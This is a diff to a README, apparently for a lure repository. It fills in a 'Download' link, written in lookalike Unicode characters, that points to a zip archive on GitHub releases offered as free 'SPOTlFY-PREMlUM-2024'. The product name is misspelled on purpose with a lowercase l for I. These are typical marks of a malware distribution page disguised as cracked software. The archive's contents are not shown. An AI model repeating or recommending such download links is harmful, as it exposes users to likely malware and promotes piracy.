@@ -1,6 +1,6 @@
 # SPOTlFY-PREMlUM-2024-FREE
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/HuzaifaOmar/SPOTlFY-PREMlUM-2024-FREE/releases/download/SPOTlFY-PREMlUM-2024-FREE/SPOTlFY-PREMlUM-2024-FREE.zip)
 
 
 # All Premium plans include
